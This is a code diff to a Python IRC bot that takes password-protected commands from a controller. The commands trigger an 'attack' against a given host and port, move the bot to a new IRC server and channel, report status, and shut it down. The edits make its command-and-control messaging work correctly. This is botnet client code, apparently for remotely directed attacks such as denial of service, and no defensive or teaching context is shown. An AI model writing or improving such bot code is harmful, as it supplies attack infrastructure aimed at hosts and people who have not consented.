@@ -53,6 +53,7 @@ def listen(s):
        if (command =="PRIVMSG"):
             msg = args[1].rstrip().split(" ")
             print(str(msg))
+            clientNick = prefix.split("!")
             if (msg[0]== PASS):
                 if msg[1] == "status":
                     clientNick = prefix.split("!")
@@ -61,11 +62,10 @@ def listen(s):
                 elif msg[1] == "attack":
                     attack(msg[2], msg[3])
                 elif msg[1] == "move":
-                    clientNick = prefix.split("!")
                     print(clientNick[0])
                     break
                 elif msg[1] == "shutdown":
-                    shutdown()
+                    shutdown(clientNick[0])
 
        print(rec)
 
@@ -97,7 +97,7 @@ def parsemsg(s):
 
 def status(clinetNick,s):
 
-    msg = "PRIVMSG "+clinetNick+" :" +PASS + "status "+botName+"\r\n"
+    msg = "PRIVMSG "+clinetNick+" :" +PASS + " status "+botName+"\r\n"
     print(msg)
     s.send(msg.encode('utf-8'))
     #private message controller
@@ -117,10 +117,10 @@ def attack(atkhost, atkport):
     #report back to controller
 
 def move(newhost, newport, newchan, clientNick):
-    reportmsg = "PRIVMSG %s %s moved" % (clientNick, PASS)
+    reportmsg = "PRIVMSG %s %s moved\r\n" % (clientNick, PASS)
     s.send(reportmsg.encode('utf-8'))
     success = False
-    s.send(("QUIT").encode('utf-8'))
+    s.send(("QUIT\r\n").encode('utf-8'))
     s.close()
     global HOST
     HOST=newhost
@@ -155,8 +155,11 @@ def move(newhost, newport, newchan, clientNick):
 
     #if failure, keep trying? or maybe stay on old IRC?
 
-def shutdown():
-    s.send(("QUIT").encode('utf-8'))
+def shutdown(clientNick):
+    sut = "PRIVMSG %s :%s shutdown %s\r\n" % (clientNick, PASS, botName)
+    print(sut)
+    s.send(sut.encode('utf-8'))
+    s.send(("QUIT\r\n").encode('utf-8'))
     sys.exit(0)
 
 
